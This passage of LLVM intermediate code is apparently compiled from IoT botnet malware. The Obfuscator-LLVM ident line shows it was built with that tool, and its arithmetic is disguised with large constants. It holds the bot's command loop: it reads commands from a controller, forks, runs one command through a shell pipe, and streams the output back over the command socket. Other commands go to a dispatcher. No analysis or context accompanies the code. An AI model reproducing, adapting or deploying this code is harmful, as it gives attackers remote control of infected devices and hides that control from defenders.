  %358 = load i8*, i8** %25, align 8
  %359 = load i8, i8* %358, align 1
  %360 = zext i8 %359 to i32
  %361 = icmp ne i32 %360, 32
  br i1 %361, label %362, label %367

; <label>:362:                                    ; preds = %357
  %363 = load i8*, i8** %25, align 8
  %364 = load i8, i8* %363, align 1
  %365 = zext i8 %364 to i32
  %366 = icmp ne i32 %365, 0
  br label %367

; <label>:367:                                    ; preds = %362, %357
  %368 = phi i1 [ false, %357 ], [ %366, %362 ]
  br i1 %368, label %369, label %372

; <label>:369:                                    ; preds = %367
  %370 = load i8*, i8** %25, align 8
  %371 = getelementptr inbounds i8, i8* %370, i32 1
  store i8* %371, i8** %25, align 8
  br label %357

; <label>:372:                                    ; preds = %367
  %373 = load i8*, i8** %25, align 8
  %374 = load i8, i8* %373, align 1
  %375 = zext i8 %374 to i32
  %376 = icmp eq i32 %375, 0
  br i1 %376, label %377, label %378

; <label>:377:                                    ; preds = %372
  br label %216

; <label>:378:                                    ; preds = %372
  %379 = load i8*, i8** %25, align 8
  store i8 0, i8* %379, align 1
  %380 = load i8*, i8** %24, align 8
  %381 = getelementptr inbounds i8, i8* %380, i64 1
  store i8* %381, i8** %25, align 8
  %382 = load i8*, i8** %24, align 8
  %383 = load i8*, i8** %25, align 8
  %384 = call i64 @strlen(i8* %383) #10
  %385 = getelementptr inbounds i8, i8* %382, i64 %384
  %386 = getelementptr inbounds i8, i8* %385, i64 2
  store i8* %386, i8** %24, align 8
  br label %387

; <label>:387:                                    ; preds = %412, %378
  %388 = load i8*, i8** %24, align 8
  %389 = load i8*, i8** %24, align 8
  %390 = call i64 @strlen(i8* %389) #10
  %391 = sub i64 %390, 664624628938209351
  %392 = sub i64 %391, 1
  %393 = add i64 %392, 664624628938209351
  %394 = sub i64 %390, 1
  %395 = getelementptr inbounds i8, i8* %388, i64 %393
  %396 = load i8, i8* %395, align 1
  %397 = zext i8 %396 to i32
  %398 = icmp eq i32 %397, 10
  br i1 %398, label %410, label %399

; <label>:399:                                    ; preds = %387
  %400 = load i8*, i8** %24, align 8
  %401 = load i8*, i8** %24, align 8
  %402 = call i64 @strlen(i8* %401) #10
  %403 = sub i64 0, 1
  %404 = add i64 %402, %403
  %405 = sub i64 %402, 1
  %406 = getelementptr inbounds i8, i8* %400, i64 %404
  %407 = load i8, i8* %406, align 1
  %408 = zext i8 %407 to i32
  %409 = icmp eq i32 %408, 13
  br label %410

; <label>:410:                                    ; preds = %399, %387
  %411 = phi i1 [ true, %387 ], [ %409, %399 ]
  br i1 %411, label %412, label %421

; <label>:412:                                    ; preds = %410
  %413 = load i8*, i8** %24, align 8
  %414 = load i8*, i8** %24, align 8
  %415 = call i64 @strlen(i8* %414) #10
  %416 = sub i64 %415, -7810420473523193098
  %417 = sub i64 %416, 1
  %418 = add i64 %417, -7810420473523193098
  %419 = sub i64 %415, 1
  %420 = getelementptr inbounds i8, i8* %413, i64 %418
  store i8 0, i8* %420, align 1
  br label %387

; <label>:421:                                    ; preds = %410
  %422 = load i8*, i8** %24, align 8
  store i8* %422, i8** %26, align 8
  br label %423

; <label>:423:                                    ; preds = %435, %421
  %424 = load i8*, i8** %24, align 8
  %425 = load i8, i8* %424, align 1
  %426 = zext i8 %425 to i32
  %427 = icmp ne i32 %426, 32
  br i1 %427, label %428, label %433

; <label>:428:                                    ; preds = %423
  %429 = load i8*, i8** %24, align 8
  %430 = load i8, i8* %429, align 1
  %431 = zext i8 %430 to i32
  %432 = icmp ne i32 %431, 0
  br label %433

; <label>:433:                                    ; preds = %428, %423
  %434 = phi i1 [ false, %423 ], [ %432, %428 ]
  br i1 %434, label %435, label %438

; <label>:435:                                    ; preds = %433
  %436 = load i8*, i8** %24, align 8
  %437 = getelementptr inbounds i8, i8* %436, i32 1
  store i8* %437, i8** %24, align 8
  br label %423

; <label>:438:                                    ; preds = %433
  %439 = load i8*, i8** %24, align 8
  store i8 0, i8* %439, align 1
  %440 = load i8*, i8** %24, align 8
  %441 = getelementptr inbounds i8, i8* %440, i32 1
  store i8* %441, i8** %24, align 8
  %442 = load i8*, i8** %26, align 8
  store i8* %442, i8** %27, align 8
  br label %443

; <label>:443:                                    ; preds = %447, %438
  %444 = load i8*, i8** %27, align 8
  %445 = load i8, i8* %444, align 1
  %446 = icmp ne i8 %445, 0
  br i1 %446, label %447, label %456

; <label>:447:                                    ; preds = %443
  %448 = load i8*, i8** %27, align 8
  %449 = load i8, i8* %448, align 1
  %450 = zext i8 %449 to i32
  %451 = call i32 @toupper(i32 %450) #10
  %452 = trunc i32 %451 to i8
  %453 = load i8*, i8** %27, align 8
  store i8 %452, i8* %453, align 1
  %454 = load i8*, i8** %27, align 8
  %455 = getelementptr inbounds i8, i8* %454, i32 1
  store i8* %455, i8** %27, align 8
  br label %443

; <label>:456:                                    ; preds = %443
  %457 = load i8*, i8** %26, align 8
  %458 = call i32 @strcmp(i8* %457, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.554, i32 0, i32 0)) #10
  %459 = icmp eq i32 %458, 0
  br i1 %459, label %460, label %486

; <label>:460:                                    ; preds = %456
  %461 = call i32 @listFork()
  %462 = icmp ne i32 %461, 0
  br i1 %462, label %463, label %464

; <label>:463:                                    ; preds = %460
  br label %216

; <label>:464:                                    ; preds = %460
  %465 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %465, i8 0, i64 1024, i32 16, i1 false)
  %466 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i32 0, i32 0
  %467 = load i8*, i8** %24, align 8
  %468 = call i32 (i8*, i8*, ...) @szprintf(i8* %466, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.555, i32 0, i32 0), i8* %467)
  %469 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i32 0, i32 0
  %470 = call i32 @fdpopen(i8* %469, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.544, i32 0, i32 0))
  store i32 %470, i32* %29, align 4
  br label %471

; <label>:471:                                    ; preds = %476, %464
  %472 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i32 0, i32 0
  %473 = load i32, i32* %29, align 4
  %474 = call i8* @fdgets(i8* %472, i32 1024, i32 %473)
  %475 = icmp ne i8* %474, null
  br i1 %475, label %476, label %483

; <label>:476:                                    ; preds = %471
  %477 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i32 0, i32 0
  call void @trim(i8* %477)
  %478 = load i32, i32* @mainCommSock, align 4
  %479 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i32 0, i32 0
  %480 = call i32 (i32, i8*, ...) @sockprintf(i32 %478, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.556, i32 0, i32 0), i8* %479)
  %481 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %481, i8 0, i64 1024, i32 16, i1 false)
  %482 = call i32 @sleep(i32 1)
  br label %471

; <label>:483:                                    ; preds = %471
  %484 = load i32, i32* %29, align 4
  %485 = call i32 @fdpclose(i32 %484)
  call void @exit(i32 0) #14
  unreachable

; <label>:486:                                    ; preds = %456
  store i32 1, i32* %31, align 4
  %487 = load i8*, i8** %24, align 8
  %488 = call i8* @strtok(i8* %487, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.557, i32 0, i32 0)) #2
  store i8* %488, i8** %32, align 8
  %489 = load i8*, i8** %26, align 8
  %490 = getelementptr inbounds [10 x i8*], [10 x i8*]* %30, i64 0, i64 0
  store i8* %489, i8** %490, align 16
  br label %491

; <label>:491:                                    ; preds = %532, %486
  %492 = load i8*, i8** %32, align 8
  %493 = icmp ne i8* %492, null
  br i1 %493, label %494, label %534

; <label>:494:                                    ; preds = %491
  %495 = load i8*, i8** %32, align 8
  %496 = load i8, i8* %495, align 1
  %497 = zext i8 %496 to i32
  %498 = icmp ne i32 %497, 10
  br i1 %498, label %499, label %532

; <label>:499:                                    ; preds = %494
  %500 = load i8*, i8** %32, align 8
  %501 = call i64 @strlen(i8* %500) #10
  %502 = add i64 %501, -3629220702899652548
  %503 = add i64 %502, 1
  %504 = sub i64 %503, -3629220702899652548
  %505 = add i64 %501, 1
  %506 = call noalias i8* @malloc(i64 %504) #2
  %507 = load i32, i32* %31, align 4
  %508 = sext i32 %507 to i64
  %509 = getelementptr inbounds [10 x i8*], [10 x i8*]* %30, i64 0, i64 %508
  store i8* %506, i8** %509, align 8
  %510 = load i32, i32* %31, align 4
  %511 = sext i32 %510 to i64
  %512 = getelementptr inbounds [10 x i8*], [10 x i8*]* %30, i64 0, i64 %511
  %513 = load i8*, i8** %512, align 8
  %514 = load i8*, i8** %32, align 8
  %515 = call i64 @strlen(i8* %514) #10
  %516 = sub i64 0, %515
  %517 = sub i64 0, 1
  %518 = add i64 %516, %517
  %519 = sub i64 0, %518
  %520 = add i64 %515, 1
  call void @llvm.memset.p0i8.i64(i8* %513, i8 0, i64 %519, i32 1, i1 false)
  %521 = load i32, i32* %31, align 4
  %522 = sext i32 %521 to i64
  %523 = getelementptr inbounds [10 x i8*], [10 x i8*]* %30, i64 0, i64 %522
  %524 = load i8*, i8** %523, align 8
  %525 = load i8*, i8** %32, align 8
  %526 = call i8* @strcpy(i8* %524, i8* %525) #2
  %527 = load i32, i32* %31, align 4
  %528 = sub i32 %527, 419838325
  %529 = add i32 %528, 1
  %530 = add i32 %529, 419838325
  %531 = add nsw i32 %527, 1
  store i32 %530, i32* %31, align 4
  br label %532

; <label>:532:                                    ; preds = %499, %494
  %533 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.557, i32 0, i32 0)) #2
  store i8* %533, i8** %32, align 8
  br label %491

; <label>:534:                                    ; preds = %491
  %535 = load i32, i32* %31, align 4
  %536 = getelementptr inbounds [10 x i8*], [10 x i8*]* %30, i32 0, i32 0
  call void @processCmd(i32 %535, i8** %536)
  %537 = load i32, i32* %31, align 4
  %538 = icmp sgt i32 %537, 1
  br i1 %538, label %539, label %556

; <label>:539:                                    ; preds = %534
  store i32 1, i32* %33, align 4
  store i32 1, i32* %33, align 4
  br label %540

; <label>:540:                                    ; preds = %549, %539
  %541 = load i32, i32* %33, align 4
  %542 = load i32, i32* %31, align 4
  %543 = icmp slt i32 %541, %542
  br i1 %543, label %544, label %555

; <label>:544:                                    ; preds = %540
  %545 = load i32, i32* %33, align 4
  %546 = sext i32 %545 to i64
  %547 = getelementptr inbounds [10 x i8*], [10 x i8*]* %30, i64 0, i64 %546
  %548 = load i8*, i8** %547, align 8
  call void @free(i8* %548) #2
  br label %549

; <label>:549:                                    ; preds = %544
  %550 = load i32, i32* %33, align 4
  %551 = add i32 %550, -2040927434
  %552 = add i32 %551, 1
  %553 = sub i32 %552, -2040927434
  %554 = add nsw i32 %550, 1
  store i32 %553, i32* %33, align 4
  br label %540

; <label>:555:                                    ; preds = %540
  br label %556

; <label>:556:                                    ; preds = %555, %534
  br label %557

; <label>:557:                                    ; preds = %556, %348
  br label %216

; <label>:558:                                    ; preds = %347, %216
  br label %205
                                                  ; No predecessors!
  %560 = load i32, i32* %3, align 4
  ret i32 %560
}

; Function Attrs: nounwind
declare i8* @strncpy(i8*, i8*, i64) #4

declare i32 @prctl(...) #3

declare %struct._IO_FILE* @fopen(i8*, i8*) #3

; Function Attrs: nounwind
declare i8* @getcwd(i8*, i64) #4

; Function Attrs: nounwind
declare i32 @feof(%struct._IO_FILE*) #4

declare i8* @fgets(i8*, i32, %struct._IO_FILE*) #3

; Function Attrs: nounwind readonly
declare i32 @strcasecmp(i8*, i8*) #1

declare i32 @fclose(%struct._IO_FILE*) #3

declare i32 @fputs(i8*, %struct._IO_FILE*) #3

; Function Attrs: nounwind
declare i32 @setsid() #4

; Function Attrs: nounwind
declare i32 @chdir(i8*) #4

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #4

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { nounwind returns_twice "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { nounwind readonly }
attributes #11 = { nounwind returns_twice }
attributes #12 = { noreturn }
attributes #13 = { nounwind readnone }
attributes #14 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146579359}
!2 = !{i32 -2146578668}
!3 = !{i32 -2146577974}
!4 = !{i32 -2146577214}
!5 = !{i32 -2146576391}
!6 = !{i32 -2146575484}
